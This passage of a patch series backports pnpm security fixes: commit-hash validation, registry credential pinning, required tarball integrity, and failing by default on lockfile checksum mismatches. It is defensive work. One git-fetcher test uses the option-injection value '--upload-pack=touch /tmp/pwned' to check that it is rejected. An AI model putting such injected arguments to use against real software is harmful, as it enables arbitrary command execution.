++function isValidCommitHash (commit: string): boolean {
++  return /^[0-9a-f]{40}$/i.test(commit)
++}
++
+ function shouldUseShallow (repoUrl: string, allowedHosts: Set<string>): boolean {
+   try {
+     const { host } = new URL(repoUrl)
+--- a/fetching/git-fetcher/test/index.ts
++++ b/fetching/git-fetcher/test/index.ts
+@@ -205,7 +205,7 @@ test('fail when preparing a git-hosted package', async () => {
+   ).rejects.toThrow('Failed to prepare git-hosted package fetched from "https://github.com/pnpm-e2e/prepare-script-fails.git": @pnpm.e2e/prepare-script-fails@1.0.0 npm-install: `npm install`')
+ })
+ 
+-test('fail when preparing a git-hosted package with a partial commit', async () => {
++test('reject a partial commit before invoking git', async () => {
+   const storeDir = tempy.directory()
+   const fetch = createGitFetcher({
+     rawConfig: {},
+@@ -219,7 +219,24 @@ test('fail when preparing a git-hosted package with a partial commit', async ()
+       }, {
+         filesIndexFile: path.join(storeDir, 'index.json'),
+       })
+-  ).rejects.toThrow(/received commit [0-9a-f]{40} does not match expected value deadbeef/)
++  ).rejects.toThrow('Invalid git commit hash "deadbeef"')
++  expect(jest.mocked(execa)).not.toHaveBeenCalled()
++})
++
++test('reject a commit value that looks like a git option', async () => {
++  const storeDir = tempy.directory()
++  const fetch = createGitFetcher({ rawConfig: {} }).git
++  await expect(
++    fetch(createCafsStore(storeDir),
++      {
++        commit: '--upload-pack=touch /tmp/pwned',
++        repo: 'file:///tmp/repo.git',
++        type: 'git',
++      }, {
++        filesIndexFile: path.join(storeDir, 'index.json'),
++      })
++  ).rejects.toThrow('Invalid git commit hash "--upload-pack=touch /tmp/pwned"')
++  expect(jest.mocked(execa)).not.toHaveBeenCalled()
+ })
+ 
+ test('do not build the package when scripts are ignored', async () => {
+
 --- a/__typings__/local.d.ts
 +++ b/__typings__/local.d.ts
 @@ -118,6 +118,16 @@ declare module '@pnpm/patch-package/dist/applyPatches' {
@@ -441,6 +1160,883 @@
 +  }).not.toThrow()
 +})
 
+--- a/config/config/src/index.ts
++++ b/config/config/src/index.ts
+@@ -24,6 +24,7 @@ import { hasDependencyBuildOptions, extractAndRemoveDependencyBuildOptions } fro
+ import { getNetworkConfigs } from './getNetworkConfigs.js'
+ import { transformPathKeys } from './transformPath.js'
+ import { getCacheDir, getConfigDir, getDataDir, getStateDir } from './dirs.js'
++import { rescopeUnscopedCreds } from './rescopeUnscopedCreds.js'
+ import {
+   type Config,
+   type ConfigWithDeprecatedSettings,
+@@ -226,6 +227,16 @@ export async function getConfig (opts: {
+     if (warn) warnings.push(warn)
+   }
+ 
++  // CVE-2026-50017: pin unscoped per-registry settings to their source's
++  // registry at load time, so a lower-priority layer overriding registry=
++  // cannot rebind a credential authored elsewhere to its own registry.
++  // Mutates each source in npmConfig.list and cliOptions in place.
++  const sourceLabels = ['<command line>', '<environment>', '<project>', '<workspace>', '<user>', '<global>', '<pnpm-builtin>', '<defaults>']
++  for (let i = 0; i < npmConfig.list.length; i++) {
++    rescopeUnscopedCreds(npmConfig.list[i] as Record<string, unknown>, sourceLabels[i] ?? `<source-${i}>`, npmDefaults.registry as string, warnings)
++  }
++  rescopeUnscopedCreds(cliOptions as Record<string, unknown>, '<command line>', npmDefaults.registry as string, warnings)
++
+   delete cliOptions.prefix
+ 
+   process.execPath = originalExecPath
+new file mode 100644
+--- /dev/null
++++ b/config/config/src/rescopeUnscopedCreds.ts
+@@ -0,0 +1,84 @@
++// CVE-2026-50017 backport: pin unscoped per-registry settings to their
++// source's registry at load time.
++//
++// When a workspace `.npmrc` (or pnpm-workspace.yaml, or any layer below the
++// user-level config) overrides `registry=` to a value the user did not
++// choose, unscoped credential keys (`_authToken`, `_auth`, `username`/
++// `_password`, `tokenHelper`) authored in the user-level config must NOT
++// follow the override. Each source's unscoped per-registry keys are
++// rewritten to their URL-scoped form (`//host[:port]/path/:<key>=...`)
++// using the same source's `registry=` value, or the npm default if the
++// source declares none. A later layer overriding `registry=` can no
++// longer rebind a credential to its own registry — the credential is
++// already pinned to the URL its author intended.
++//
++// `cert`/`key` (inline PEM) are pinned for the same trust-boundary
++// reason. `ca`/`cafile` are intentionally left unscoped: they are trust
++// anchors, not credentials, and corporate MITM-proxy setups depend on
++// them applying globally.
++import normalizeRegistryUrl from 'normalize-registry-url'
++
++const UNSCOPED_RESCOPABLE_KEYS = [
++  '_authToken', '_auth', 'username', '_password', 'tokenHelper',
++  'cert', 'key',
++] as const
++
++// Convert a registry URL to its nerf-darted form (`//host[:port]/path/`).
++// Mirrors `@pnpm/config.nerf-dart` so this package does not need a new
++// dependency for the backport.
++function nerfDart (url: string): string {
++  const parsed = new URL(url)
++  const pathname = parsed.pathname.endsWith('/') ? parsed.pathname : `${parsed.pathname}/`
++  return `//${parsed.host}${pathname}`
++}
++
++/**
++ * Rewrite any unscoped per-registry keys in `source` to their URL-scoped
++ * equivalents using `source.registry` (or `defaultRegistry` if the source
++ * does not declare its own). Mutates `source` in place and returns it.
++ *
++ * A URL-scoped key for the same registry already present in `source` is
++ * preserved — we never overwrite an explicit scoped value.
++ */
++export function rescopeUnscopedCreds (
++  source: Record<string, unknown>,
++  sourceLabel: string,
++  defaultRegistry: string,
++  warnings: string[]
++): Record<string, unknown> {
++  if (!UNSCOPED_RESCOPABLE_KEYS.some(key => key in source)) {
++    return source
++  }
++  const rawRegistry = typeof source.registry === 'string' && source.registry !== '' ? source.registry : null
++  const fallbackRegistry = rawRegistry ?? defaultRegistry
++  let nerfedRegistry: string
++  try {
++    nerfedRegistry = nerfDart(normalizeRegistryUrl(fallbackRegistry))
++  } catch {
++    // `registry=` resolved to something `URL` can't parse — often an
++    // unresolved `${VAR}` placeholder. Drop the unscoped keys (a bare
++    // token has nowhere safe to bind) and warn.
++    const dropped = UNSCOPED_RESCOPABLE_KEYS.filter(key => key in source)
++    for (const key of dropped) delete source[key]
++    warnings.push(`Unscoped per-registry settings (${dropped.join(', ')}) in "${sourceLabel}" were ignored: ` +
++      `the source's "registry" value (${JSON.stringify(source.registry)}) is not a parseable URL, so pnpm cannot pin them anywhere safe. ` +
++      'Write them URL-scoped (e.g. "//registry.example.com/:_authToken=...") to send them to a specific registry.')
++    return source
++  }
++  const rescoped: string[] = []
++  for (const key of UNSCOPED_RESCOPABLE_KEYS) {
++    if (!(key in source)) continue
++    const scopedKey = `${nerfedRegistry}:${key}`
++    if (!(scopedKey in source)) {
++      source[scopedKey] = source[key]
++    }
++    delete source[key]
++    rescoped.push(key)
++  }
++  if (rescoped.length > 0) {
++    warnings.push(`Unscoped per-registry settings (${rescoped.join(', ')}) in "${sourceLabel}" are deprecated. ` +
++      `pnpm pinned them to "${nerfedRegistry}" for this run, but a future release will stop supporting unscoped per-registry settings. ` +
++      `Write them as "${nerfedRegistry}:${rescoped[0]}=..." instead.`)
++  }
++  return source
++}
+
+Description: Fix CVE-2026-50021 - require integrity for tarball-shaped lockfile resolutions
+ A tampered pnpm-lock.yaml that strips the integrity field from a tarball
+ resolution let the worker download the URL contents and mint a fresh
+ integrity from the unverified bytes. An attacker who could both alter the
+ lockfile and serve modified content at the referenced tarball URL could
+ install a tampered package without any error - including under
+ --frozen-lockfile.
+ .
+ pkgSnapshotToResolution now fails closed at lockfile-read time with
+ ERR_PNPM_MISSING_TARBALL_INTEGRITY whenever a tarball-shaped resolution
+ (no `type` field) lacks integrity. Git-hosted tarballs and file: tarballs
+ remain exempt: the commit SHA in a git-host URL and the user-controlled
+ local path already anchor the bytes.
+ .
+ Backport of upstream commit b8196b82 (PR #12007) from release/10,
+ shipped in pnpm v10.34.1. Adapted for v10.32.1: target uses
+ isGitHostedPkgUrl from @pnpm/pick-fetcher; the patch mirrors upstream by
+ dropping that dependency and adding a local isGitHostedTarballUrl helper.
+Origin: upstream, https://github.com/pnpm/pnpm/commit/b8196b82d10ccc4ace8b33e9f9d10b83014351dd
+Author: Zoltan Kochan <z@kochan.io>
+Last-Update: 2026-06-30
+
+--- a/lockfile/utils/package.json
++++ b/lockfile/utils/package.json
+@@ -34,6 +34,7 @@
+   },
+   "dependencies": {
+     "@pnpm/dependency-path": "workspace:*",
++    "@pnpm/error": "workspace:*",
+     "@pnpm/lockfile.types": "workspace:*",
+     "@pnpm/resolver-base": "workspace:*",
+     "@pnpm/types": "workspace:*",
+--- a/lockfile/utils/src/pkgSnapshotToResolution.ts
++++ b/lockfile/utils/src/pkgSnapshotToResolution.ts
+@@ -1,4 +1,5 @@
+ import url from 'url'
++import { PnpmError } from '@pnpm/error'
+ import { type PackageSnapshot, type TarballResolution } from '@pnpm/lockfile.types'
+ import { type Resolution } from '@pnpm/resolver-base'
+ import { type Registries } from '@pnpm/types'
+@@ -10,10 +11,22 @@ export function pkgSnapshotToResolution (
+   pkgSnapshot: PackageSnapshot,
+   registries: Registries
+ ): Resolution {
++  const resolution = pkgSnapshot.resolution as TarballResolution
+   if (
+-    Boolean((pkgSnapshot.resolution as TarballResolution).type) ||
+-    (pkgSnapshot.resolution as TarballResolution).tarball?.startsWith('file:') ||
+-    (pkgSnapshot.resolution as TarballResolution).gitHosted === true
++    resolution.type == null &&
++    resolution.integrity == null &&
++    !resolution.tarball?.startsWith('file:') &&
++    !(resolution.gitHosted === true || (resolution.tarball != null && isGitHostedTarballUrl(resolution.tarball)))
++  ) {
++    throw new PnpmError('MISSING_TARBALL_INTEGRITY',
++      `Cannot install package "${depPath}": its lockfile entry has no "integrity" field, so pnpm cannot verify the downloaded tarball.`,
++      { hint: 'The lockfile may be corrupted or have been tampered with. Restore it from a trusted source, or delete it and re-run installation without --frozen-lockfile to regenerate.' }
++    )
++  }
++  if (
++    Boolean(resolution.type) ||
++    resolution.tarball?.startsWith('file:') ||
++    resolution.gitHosted === true
+   ) {
+     return pkgSnapshot.resolution as Resolution
+   }
+@@ -47,3 +60,11 @@ export function pkgSnapshotToResolution (
+     return getNpmTarballUrl(name, version, { registry })
+   }
+ }
++
++function isGitHostedTarballUrl (url: string): boolean {
++  return (
++    url.startsWith('https://codeload.github.com/') ||
++    url.startsWith('https://bitbucket.org/') ||
++    url.startsWith('https://gitlab.com/')
++  )
++}
+--- a/lockfile/utils/test/pkgSnapshotToResolution.ts
++++ b/lockfile/utils/test/pkgSnapshotToResolution.ts
+@@ -32,9 +32,67 @@ test('pkgSnapshotToResolution()', () => {
+ 
+   expect(pkgSnapshotToResolution('@cdn.sheetjs.com/xlsx-0.18.9/xlsx-0.18.9.tgz', {
+     resolution: {
++      integrity: 'sha512-CCCC',
+       tarball: 'https://cdn.sheetjs.com/xlsx-0.18.9/xlsx-0.18.9.tgz',
+     },
+   }, { default: 'https://registry.npmjs.org/' })).toEqual({
++    integrity: 'sha512-CCCC',
+     tarball: 'https://cdn.sheetjs.com/xlsx-0.18.9/xlsx-0.18.9.tgz',
+   })
+ })
++
++test('pkgSnapshotToResolution() rejects a remote tarball resolution that has no integrity', () => {
++  // A tampered or malformed lockfile that strips the `integrity` field
++  // would otherwise let pnpm download the URL contents unchecked. The
++  // helper must fail closed so neither install path nor any read-only
++  // consumer (sbom, list, etc.) silently trusts the lockfile entry.
++  expect(() => pkgSnapshotToResolution('foo@1.0.0', {
++    resolution: {
++      tarball: 'https://registry.npmjs.org/foo/-/foo-1.0.0.tgz',
++    },
++  }, { default: 'https://registry.npmjs.org/' })).toThrow(expect.objectContaining({ code: 'ERR_PNPM_MISSING_TARBALL_INTEGRITY' }))
++
++  // A tarball URL on an arbitrary CDN (no `gitHosted` flag, no known git
++  // host pattern) is still a regular remote tarball — integrity required.
++  expect(() => pkgSnapshotToResolution('xlsx@https+++cdn.sheetjs.com+xlsx-0.18.9+xlsx-0.18.9.tgz', {
++    resolution: {
++      tarball: 'https://cdn.sheetjs.com/xlsx-0.18.9/xlsx-0.18.9.tgz',
++    },
++  }, { default: 'https://registry.npmjs.org/' })).toThrow(expect.objectContaining({ code: 'ERR_PNPM_MISSING_TARBALL_INTEGRITY' }))
++})
++
++test('pkgSnapshotToResolution() allows git-hosted and file: tarballs to lack integrity', () => {
++  // Git-hosted tarballs are anchored by the commit SHA in their URL —
++  // pnpm's own install pipeline writes them without `integrity:` (see
++  // the `with-git-protocol-dep` fixture). Both the explicit
++  // `gitHosted: true` flag and a URL on a known git host must bypass
++  // the integrity check.
++  expect(pkgSnapshotToResolution('foo@https+++github.com+foo+bar', {
++    resolution: {
++      tarball: 'https://codeload.github.com/foo/bar/tar.gz/abc1234',
++      gitHosted: true,
++    },
++  }, { default: 'https://registry.npmjs.org/' })).toEqual({
++    tarball: 'https://codeload.github.com/foo/bar/tar.gz/abc1234',
++    gitHosted: true,
++  })
++
++  expect(pkgSnapshotToResolution('is-negative@https+++codeload.github.com+kevva+is-negative+tar.gz+abc', {
++    resolution: {
++      tarball: 'https://codeload.github.com/kevva/is-negative/tar.gz/abc1234',
++    },
++  }, { default: 'https://registry.npmjs.org/' })).toEqual({
++    tarball: 'https://codeload.github.com/kevva/is-negative/tar.gz/abc1234',
++  })
++
++  // `file:` tarballs are local files; the user already controls the
++  // bytes, and the install pipeline may write them without integrity.
++  expect(pkgSnapshotToResolution('local-pkg@file:local-pkg-1.0.0.tgz', {
++    resolution: {
++      tarball: 'file:local-pkg-1.0.0.tgz',
++    },
++    version: '1.0.0',
++  }, { default: 'https://registry.npmjs.org/' })).toEqual({
++    tarball: 'file:local-pkg-1.0.0.tgz',
++  })
++})
+--- a/lockfile/utils/tsconfig.json
++++ b/lockfile/utils/tsconfig.json
+@@ -12,6 +12,9 @@
+     {
+       "path": "../../packages/dependency-path"
+     },
++    {
++      "path": "../../packages/error"
++    },
+     {
+       "path": "../../packages/types"
+     },
+
+--- /dev/null
++++ b/.changeset/integrity-mismatch-fails-by-default.md
+@@ -0,0 +1,14 @@
++---
++"@pnpm/core": minor
++"@pnpm/plugin-commands-installation": minor
++"@pnpm/worker": patch
++"pnpm": minor
++---
++
++Treat tarball-integrity mismatches against the lockfile as a hard failure by default. Previously, `pnpm install` (non-frozen) would log `ERR_PNPM_TARBALL_INTEGRITY`, silently re-resolve from the registry, and overwrite the locked integrity — which meant a compromised registry, proxy, or republished version could substitute attacker-controlled content on a clean machine even though the project shipped a committed lockfile.
++
++`pnpm install` now exits with `ERR_PNPM_TARBALL_INTEGRITY` and a hint pointing at the new opt-in flag.
++
++The only opt-in is **`pnpm install --update-checksums`** — narrowly scoped to refreshing the locked integrity values from what the registry currently serves. Mirrors yarn's flag of the same name. A warning still prints when the bypass takes effect so the operation is auditable.
++
++`--force` and `pnpm update` deliberately do **not** bypass the integrity check. They are routine refresh operations; silently overwriting a locked integrity in those flows would erase the protection a committed lockfile is supposed to provide. `--frozen-lockfile` behavior is unchanged. `--fix-lockfile` keeps its documented purpose (filling in missing lockfile entries) and is also not a bypass.
+--- a/pkg-manager/core/src/install/extendInstallOptions.ts
++++ b/pkg-manager/core/src/install/extendInstallOptions.ts
+@@ -47,6 +47,7 @@ export interface StrictInstallOptions {
+   lockfileOnly: boolean
+   forceFullResolution: boolean
+   fixLockfile: boolean
++  updateChecksums: boolean
+   dedupe: boolean
+   ignoreCompatibilityDb: boolean
+   ignoreDepScripts: boolean
+@@ -226,6 +227,7 @@ const defaults = (opts: InstallOptions): StrictInstallOptions => {
+     },
+     lockfileDir: opts.lockfileDir ?? opts.dir ?? process.cwd(),
+     lockfileOnly: false,
++    updateChecksums: false,
+     nodeVersion: opts.nodeVersion,
+     nodeLinker: 'isolated',
+     overrides: {},
+--- a/pkg-manager/core/src/install/index.ts
++++ b/pkg-manager/core/src/install/index.ts
+@@ -449,6 +449,7 @@ export async function mutateModules (
+     const upToDateLockfileMajorVersion = ctx.wantedLockfile.lockfileVersion.toString().startsWith(`${LOCKFILE_MAJOR_VERSION}.`)
+     let needsFullResolution = outdatedLockfileSettings ||
+       opts.fixLockfile ||
++      opts.updateChecksums ||
+       !upToDateLockfileMajorVersion ||
+       opts.forceFullResolution
+     if (needsFullResolution) {
+@@ -844,21 +845,16 @@ Note that in CI environments, this setting is enabled by default.`,
+         ignoredBuilds,
+       }
+     } catch (error: any) { // eslint-disable-line
++      const isIntegrityError = BROKEN_LOCKFILE_INTEGRITY_ERRORS.has(error.code)
+       if (
+         frozenLockfile ||
+         (
+           error.code !== 'ERR_PNPM_LOCKFILE_MISSING_DEPENDENCY' &&
+-          !BROKEN_LOCKFILE_INTEGRITY_ERRORS.has(error.code)
++          !isIntegrityError
+         ) ||
+-        (!ctx.existsNonEmptyWantedLockfile && !ctx.existsCurrentLockfile)
++        (!ctx.existsNonEmptyWantedLockfile && !ctx.existsCurrentLockfile) ||
++        (isIntegrityError && !opts.updateChecksums)
+       ) throw error
+-      if (BROKEN_LOCKFILE_INTEGRITY_ERRORS.has(error.code)) {
+-        needsFullResolution = true
+-        // Ideally, we would not update but currently there is no other way to redownload the integrity of the package
+-        for (const project of projects) {
+-          (project as InstallMutationOptions).update = true
+-        }
+-      }
+       // A broken lockfile may be caused by a badly resolved Git conflict
+       logger.warn({
+         error,
+@@ -1201,6 +1197,7 @@ const _installInContext: InstallFunction = async (projects, ctx, opts) => {
+       excludeLinksFromLockfile: opts.excludeLinksFromLockfile,
+       force: opts.force,
+       forceFullResolution,
++      updateChecksums: opts.updateChecksums,
+       ignoreScripts: opts.ignoreScripts,
+       hooks: {
+         readPackage: opts.readPackageHook,
+@@ -1684,19 +1681,16 @@ const installInContext: InstallFunction = async (projects, ctx, opts) => {
+   } catch (error: any) { // eslint-disable-line
+     if (
+       !BROKEN_LOCKFILE_INTEGRITY_ERRORS.has(error.code) ||
+-      (!ctx.existsNonEmptyWantedLockfile && !ctx.existsCurrentLockfile)
++      (!ctx.existsNonEmptyWantedLockfile && !ctx.existsCurrentLockfile) ||
++      !opts.updateChecksums
+     ) throw error
+     opts.needsFullResolution = true
+-    // Ideally, we would not update but currently there is no other way to redownload the integrity of the package
+-    for (const project of projects) {
+-      (project as InstallMutationOptions).update = true
+-    }
+     logger.warn({
+       error,
+       message: error.message,
+       prefix: ctx.lockfileDir,
+     })
+-    logger.error(new PnpmError(error.code, 'The lockfile is broken! A full installation will be performed in an attempt to fix it.'))
++    logger.error(new PnpmError(error.code, 'Refreshing the locked integrity from the registry as requested by --update-checksums. A full installation will be performed.'))
+     return _installInContext(projects, ctx, opts)
+   } finally {
+     await opts.storeController.close()
+--- a/pkg-manager/core/test/brokenLockfileIntegrity.ts
++++ b/pkg-manager/core/test/brokenLockfileIntegrity.ts
+@@ -12,7 +12,7 @@ import {
+ import { sync as writeYamlFile } from 'write-yaml-file'
+ import { testDefaults } from './utils/index.js'
+ 
+-test('installation breaks if the lockfile contains the wrong checksum', async () => {
++test('installation fails by default if the lockfile contains a wrong checksum, but --update-checksums recovers', async () => {
+   await addDistTag({ package: '@pnpm.e2e/dep-of-pkg-with-1-dep', version: '100.0.0', distTag: 'latest' })
+   const project = prepareEmpty()
+ 
+@@ -36,11 +36,17 @@ test('installation breaks if the lockfile contains the wrong checksum', async ()
+     rootDir: process.cwd() as ProjectRootDir,
+   }, testDefaults({ frozenLockfile: true }, { retry: { retries: 0 } }))).rejects.toThrowError(/Got unexpected checksum for/)
+ 
++  await expect(mutateModulesInSingleProject({
++    manifest,
++    mutation: 'install',
++    rootDir: process.cwd() as ProjectRootDir,
++  }, testDefaults({}, { retry: { retries: 0 } }))).rejects.toThrowError(/Got unexpected checksum for/)
++
+   await mutateModulesInSingleProject({
+     manifest,
+     mutation: 'install',
+     rootDir: process.cwd() as ProjectRootDir,
+-  }, testDefaults({}, { retry: { retries: 0 } }))
++  }, testDefaults({ updateChecksums: true }, { retry: { retries: 0 } }))
+ 
+   expect(project.readLockfile()).toStrictEqual(correctLockfile)
+ 
+@@ -49,16 +55,15 @@ test('installation breaks if the lockfile contains the wrong checksum', async ()
+ 
+   rimraf('node_modules')
+ 
+-  await mutateModulesInSingleProject({
++  // --force is NOT an opt-in: it should still fail.
++  await expect(mutateModulesInSingleProject({
+     manifest,
+     mutation: 'install',
+     rootDir: process.cwd() as ProjectRootDir,
+-  }, testDefaults({ preferFrozenLockfile: false }, { retry: { retries: 0 } }))
+-
+-  expect(project.readLockfile()).toStrictEqual(correctLockfile)
++  }, testDefaults({ force: true }, { retry: { retries: 0 } }))).rejects.toThrowError(/Got unexpected checksum for/)
+ })
+ 
+-test('installation breaks if the lockfile contains the wrong checksum and the store is clean', async () => {
++test('installation fails by default if the lockfile contains the wrong checksum and the store is clean', async () => {
+   await addDistTag({ package: '@pnpm.e2e/dep-of-pkg-with-1-dep', version: '100.0.0', distTag: 'latest' })
+   const project = prepareEmpty()
+ 
+@@ -83,35 +88,18 @@ test('installation breaks if the lockfile contains the wrong checksum and the st
+     }, testDefaults({ frozenLockfile: true }, { retry: { retries: 0 } }))
+   ).rejects.toThrowError(/Got unexpected checksum/)
+ 
+-  await mutateModulesInSingleProject({
++  await expect(mutateModulesInSingleProject({
+     manifest,
+     mutation: 'install',
+     rootDir: process.cwd() as ProjectRootDir,
+-  }, testDefaults({}, { retry: { retries: 0 } }))
++  }, testDefaults({}, { retry: { retries: 0 } }))).rejects.toThrowError(/Got unexpected checksum/)
+ 
+-  {
+-    const lockfile = project.readLockfile()
+-    expect((lockfile.packages['@pnpm.e2e/pkg-with-1-dep@100.0.0'].resolution as TarballResolution).integrity).toBe(correctIntegrity)
+-  }
+-
+-  // Breaking the lockfile again
+-  writeYamlFile(WANTED_LOCKFILE, corruptedLockfile, { lineWidth: 1000 })
+-
+-  rimraf('node_modules')
+-
+-  const reporter = jest.fn()
+   await mutateModulesInSingleProject({
+     manifest,
+     mutation: 'install',
+     rootDir: process.cwd() as ProjectRootDir,
+-  }, testDefaults({ preferFrozenLockfile: false, reporter }, { retry: { retries: 0 } }))
+-
+-  expect(reporter).toHaveBeenCalledWith(expect.objectContaining({
+-    level: 'warn',
+-    name: 'pnpm',
+-    prefix: process.cwd(),
+-    message: expect.stringMatching(/Got unexpected checksum/),
+-  }))
++  }, testDefaults({ updateChecksums: true }, { retry: { retries: 0 } }))
++
+   {
+     const lockfile = project.readLockfile()
+     expect((lockfile.packages['@pnpm.e2e/pkg-with-1-dep@100.0.0'].resolution as TarballResolution).integrity).toBe(correctIntegrity)
+--- a/pkg-manager/package-requester/src/packageRequester.ts
++++ b/pkg-manager/package-requester/src/packageRequester.ts
+@@ -186,7 +186,7 @@ async function resolveAndFetch (
+   let alias: string | undefined
+   let resolution = options.currentPkg?.resolution as Resolution
+   let pkgId = options.currentPkg?.id
+-  const skipResolution = resolution && !options.update
++  const skipResolution = resolution && !options.update && !options.updateChecksums
+   let forceFetch = false
+   let updated = false
+   let resolvedVia: string | undefined
+@@ -225,6 +225,7 @@ async function resolveAndFetch (
+       projectDir: options.projectDir,
+       workspacePackages: options.workspacePackages,
+       update: options.update,
++      updateChecksums: options.updateChecksums,
+       injectWorkspacePackages: options.injectWorkspacePackages,
+       calcSpecifier: options.calcSpecifier,
+       pinnedVersion: options.pinnedVersion,
+--- a/pkg-manager/plugin-commands-installation/src/install.ts
++++ b/pkg-manager/plugin-commands-installation/src/install.ts
+@@ -81,6 +81,7 @@ export const cliOptionsTypes = (): Record<string, unknown> => ({
+   ...rcOptionsTypes(),
+   ...pick(['force'], allTypes),
+   'fix-lockfile': Boolean,
++  'update-checksums': Boolean,
+   'resolution-only': Boolean,
+   recursive: Boolean,
+ })
+@@ -154,6 +155,10 @@ For options that may be used with `-r`, see "pnpm help recursive"',
+             description: 'Fix broken lockfile entries automatically',
+             name: '--fix-lockfile',
+           },
++          {
++            description: 'Refresh integrity checksums recorded in the lockfile from the registry',
++            name: '--update-checksums',
++          },
+           {
+             description: 'Merge lockfiles were generated on git branch',
+             name: '--merge-git-branch-lockfiles',
+@@ -344,6 +349,7 @@ export type InstallCommandOptions = Pick<Config,
+     original: string[]
+   }
+   fixLockfile?: boolean
++  updateChecksums?: boolean
+   frozenLockfileIfExists?: boolean
+   useBetaCli?: boolean
+   pruneDirectDependencies?: boolean
+--- a/pkg-manager/resolve-dependencies/src/resolveDependencies.ts
++++ b/pkg-manager/resolve-dependencies/src/resolveDependencies.ts
+@@ -155,6 +155,7 @@ export interface ResolutionContext {
+   defaultTag: string
+   dryRun: boolean
+   forceFullResolution: boolean
++  updateChecksums?: boolean
+   ignoreScripts?: boolean
+   resolvedPkgsById: ResolvedPkgsById
+   resolvePeersFromWorkspaceRoot?: boolean
+@@ -866,6 +867,7 @@ async function resolveDependenciesOfDependency (
+     proceed: extendedWantedDep.proceed || updateShouldContinue || ctx.updatedSet.size > 0,
+     publishedBy: options.publishedBy,
+     update: update ? options.updateToLatest ? 'latest' : 'compatible' : false,
++    updateChecksums: ctx.updateChecksums,
+     updateDepth,
+     updateRequested,
+     supportedArchitectures: options.supportedArchitectures,
+@@ -1254,6 +1256,7 @@ interface ResolveDependencyOptions {
+   publishedBy?: Date
+   pickLowestVersion?: boolean
+   update: false | 'compatible' | 'latest'
++  updateChecksums?: boolean
+   updateDepth: number
+   /**
+    * Whether or not an update is requested based on filter conditions (such as
+@@ -1354,6 +1357,7 @@ async function resolveDependency (
+       trustPolicyExclude: ctx.trustPolicyExclude,
+       trustPolicyIgnoreAfter: ctx.trustPolicyIgnoreAfter,
+       update: options.update,
++      updateChecksums: options.updateChecksums,
+       workspacePackages: ctx.workspacePackages,
+       supportedArchitectures: options.supportedArchitectures,
+       onFetchError: (err: any) => { // eslint-disable-line
+--- a/pkg-manager/resolve-dependencies/src/resolveDependencyTree.ts
++++ b/pkg-manager/resolve-dependencies/src/resolveDependencyTree.ts
+@@ -116,6 +116,7 @@ export interface ResolveDependenciesOptions {
+   engineStrict: boolean
+   force: boolean
+   forceFullResolution: boolean
++  updateChecksums?: boolean
+   ignoreScripts?: boolean
+   hooks: {
+     readPackage?: ReadPackageHook
+@@ -180,6 +181,7 @@ export async function resolveDependencyTree<T> (
+     engineStrict: opts.engineStrict,
+     force: opts.force,
+     forceFullResolution: opts.forceFullResolution,
++    updateChecksums: opts.updateChecksums,
+     ignoreScripts: opts.ignoreScripts,
+     injectWorkspacePackages: opts.injectWorkspacePackages,
+     linkWorkspacePackagesDepth: opts.linkWorkspacePackagesDepth ?? -1,
+--- a/resolving/npm-resolver/src/index.ts
++++ b/resolving/npm-resolver/src/index.ts
+@@ -219,6 +219,7 @@ export type ResolveFromNpmOptions = {
+   preferredVersions?: PreferredVersions
+   preferWorkspacePackages?: boolean
+   update?: false | 'compatible' | 'latest'
++  updateChecksums?: boolean
+   injectWorkspacePackages?: boolean
+   calcSpecifier?: boolean
+   pinnedVersion?: PinnedVersion
+@@ -275,6 +276,7 @@ async function resolveNpm (
+       preferredVersionSelectors: opts.preferredVersions?.[spec.name],
+       registry,
+       updateToLatest: opts.update === 'latest',
++      updateChecksums: opts.updateChecksums,
+       optional: wantedDependency.optional,
+     })
+   } catch (err: any) { // eslint-disable-line
+@@ -417,6 +419,7 @@ async function resolveJsr (
+     preferredVersionSelectors: opts.preferredVersions?.[spec.name],
+     registry,
+     updateToLatest: opts.update === 'latest',
++    updateChecksums: opts.updateChecksums,
+   })
+ 
+   if (pickedPackage == null) {
+--- a/resolving/npm-resolver/src/pickPackage.ts
++++ b/resolving/npm-resolver/src/pickPackage.ts
+@@ -68,6 +68,15 @@ export interface PickPackageOptions extends PickPackageFromMetaOptions {
+   dryRun: boolean
+   updateToLatest?: boolean
+   optional?: boolean
++  /**
++   * When true, skip the on-disk exact-version cache fast path so a
++   * stale on-disk packument can't satisfy the call without a
++   * conditional registry request. The in-memory cache is left alone:
++   * its entries can only be populated by this install's own fresh
++   * network fetches, so they're authoritative for second-and-onward
++   * lookups within the same install.
++   */
++  updateChecksums?: boolean
+ }
+ 
+ const pickPackageFromMetaUsingTimeStrict = pickPackageFromMeta.bind(null, pickVersionByVersionRange)
+@@ -171,7 +180,7 @@ export async function pickPackage (
+       }
+     }
+ 
+-    if (!opts.updateToLatest && spec.type === 'version') {
++    if (!opts.updateToLatest && !opts.updateChecksums && spec.type === 'version') {
+       metaCachedInStore = metaCachedInStore ?? await limit(async () => loadMeta(pkgMirror))
+       // use the cached meta only if it has the required package version
+       // otherwise it is probably out of date
+--- a/resolving/resolver-base/src/index.ts
++++ b/resolving/resolver-base/src/index.ts
+@@ -129,6 +129,7 @@ export interface ResolveOptions {
+   preferWorkspacePackages?: boolean
+   workspacePackages?: WorkspacePackages
+   update?: false | 'compatible' | 'latest'
++  updateChecksums?: boolean
+   injectWorkspacePackages?: boolean
+   calcSpecifier?: boolean
+   pinnedVersion?: PinnedVersion
+--- a/store/store-controller-types/src/index.ts
++++ b/store/store-controller-types/src/index.ts
+@@ -134,6 +134,7 @@ export interface RequestPackageOptions {
+   sideEffectsCache?: boolean
+   skipFetch?: boolean
+   update?: false | 'compatible' | 'latest'
++  updateChecksums?: boolean
+   workspacePackages?: WorkspacePackages
+   forceResolve?: boolean
+   supportedArchitectures?: SupportedArchitectures
+--- a/worker/src/index.ts
++++ b/worker/src/index.ts
+@@ -122,11 +122,14 @@ export class TarballIntegrityError extends PnpmError {
+       `Got unexpected checksum for "${opts.url}". Wanted "${opts.expected}". Got "${opts.found}".`,
+       {
+         attempts: opts.attempts,
+-        hint: `This error may happen when a package is republished to the registry with the same version.
+-In this case, the metadata in the local pnpm cache will contain the old integrity checksum.
++        hint: `The downloaded tarball does not match the integrity recorded in the lockfile. pnpm will not silently overwrite the locked integrity — that would defeat the lockfile's protection if a registry or proxy is serving tampered content.
+ 
+-If you think that this is the case, then run "pnpm store prune" and rerun the command that failed.
+-"pnpm store prune" will remove your local metadata cache.`,
++If you trust the new content (legitimate republish, or stale local metadata cache):
++
++  - Run "pnpm store prune" and retry, in case only the metadata cache is out of date.
++  - Run "pnpm install --update-checksums" to refresh the locked integrity from the registry.
++
